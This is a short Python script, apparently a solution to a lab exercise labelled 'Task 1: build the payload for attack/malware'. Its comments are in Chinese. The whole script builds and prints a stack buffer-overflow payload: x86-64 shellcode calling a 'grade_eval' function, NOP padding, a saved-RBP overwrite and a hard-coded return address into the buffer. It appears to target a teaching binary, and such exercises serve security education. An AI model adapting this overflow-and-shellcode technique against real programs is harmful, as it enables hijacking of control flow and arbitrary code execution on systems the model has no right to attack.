#!/usr/bin/env python3
"""Task 1: build the payload for attack/malware."""
import sys

# 栈上机器码：mov edi,4; call grade_eval（rel32偏移0x9a9b）
shellcode = b"\xbf\x04\x00\x00\x00\xe8\x9b\x9a\x00\x00"

# 用NOP补满16字节缓冲区，再覆盖saved RBP和返回地址（指向缓冲区首地址0x721000800fd0）
payload = shellcode.ljust(16, b"\x90")
payload += b"B" * 8
payload += b"\xd0\x0f\x80\x00\x10\x72\x00\x00"
payload += b"\n"

sys.stdout.buffer.write(payload)
